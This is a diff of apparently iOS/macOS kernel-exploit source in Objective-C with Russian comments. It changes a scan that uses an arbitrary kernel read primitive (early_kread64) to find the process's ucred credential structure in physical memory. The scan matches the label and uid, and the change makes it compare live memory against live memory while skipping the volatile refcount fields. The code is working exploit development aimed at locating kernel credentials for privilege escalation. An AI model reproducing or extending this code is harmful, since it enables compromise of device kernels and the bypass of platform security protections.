@@ -8286,11 +8286,22 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             // (a) страница ucred: label + uid на тех же смещениях
                             if (!pagePA && early_kread64(pkva2 + uoff2 + 0x78) == labelQ &&
                                 (uint32_t)early_kread64(pkva2 + uoff2 + 0x18) == uid32) {
+                                // 2.0.11: сверка ЖИВОЙ vs ЖИВОЙ (не со снимком
+                                // ucImg — он устаревает за минуты скана; cr_ref
+                                // на +0x10 тикает и ронял верный кандидат
+                                // 0x1017eeb8000 в 2.0.10). Поле +0x08..+0x18
+                                // (ref/aux) пропускаем как volatile.
                                 BOOL full = YES;
-                                for (uint32_t i = 0; i < 0x100; i += 8)
-                                    if (early_kread64(pkva2 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
-                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ucred-кандидат pa=%#llx: label+uid сошлись, сверка 0x100 — %@",
-                                          (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                                uint32_t diffOff = 0xFFFFFFFF;
+                                for (uint32_t i = 0; i < 0x100; i += 8) {
+                                    if (i >= 0x08 && i < 0x18) continue;   // volatile: ref/aux
+                                    uint64_t a = early_kread64(pkva2 + i);
+                                    uint64_t b = early_kread64(ucF + i);
+                                    if (a != b) { full = NO; diffOff = i; break; }
+                                }
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] ucred-кандидат pa=%#llx: label+uid сошлись, live-сверка — %@%@",
+                                          (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо",
+                                          full ? @"" : [NSString stringWithFormat:@" (расхождение @+%#x)", diffOff]]);
                                 if (full) pagePA = pa;
                             }
                             // (b) страница proc_ro: поле==ucF + 3 соседа (анти-ложные)
@@ -8338,10 +8349,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                 if (!pagePA && early_kread64(pkva3 + uoff2 + 0x78) == labelQ &&
                                     (uint32_t)early_kread64(pkva3 + uoff2 + 0x18) == uid32) {
                                     BOOL full = YES;
-                                    for (uint32_t i = 0; i < 0x100; i += 8)
-                                        if (early_kread64(pkva3 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
-                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] ucred-кандидат pa=%#llx (тип %d) — сверка: %@",
-                                              (unsigned long long)lpa, lt, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                                    uint32_t diffOff = 0xFFFFFFFF;
+                                    for (uint32_t i = 0; i < 0x100; i += 8) {
+                                        if (i >= 0x08 && i < 0x18) continue;   // volatile: ref/aux
+                                        uint64_t a = early_kread64(pkva3 + i);
+                                        uint64_t b = early_kread64(ucF + i);
+                                        if (a != b) { full = NO; diffOff = i; break; }
+                                    }
+                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] ucred-кандидат pa=%#llx (тип %d) — live-сверка: %@%@",
+                                              (unsigned long long)lpa, lt, full ? @"СОШЛАСЬ ★" : @"мимо",
+                                              full ? @"" : [NSString stringWithFormat:@" (расхождение @+%#x)", diffOff]]);
                                     if (full) pagePA = lpa;
                                 }
                                 if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000 &&
